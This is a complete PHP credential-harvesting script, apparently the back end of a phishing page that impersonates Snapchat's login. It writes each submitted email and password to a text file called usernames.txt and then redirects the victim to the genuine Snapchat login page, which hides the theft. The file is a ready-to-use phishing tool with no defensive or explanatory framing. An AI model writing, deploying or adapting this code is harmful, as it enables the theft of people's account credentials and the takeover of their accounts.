<?php

file_put_contents("usernames.txt", "Sc Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
?>
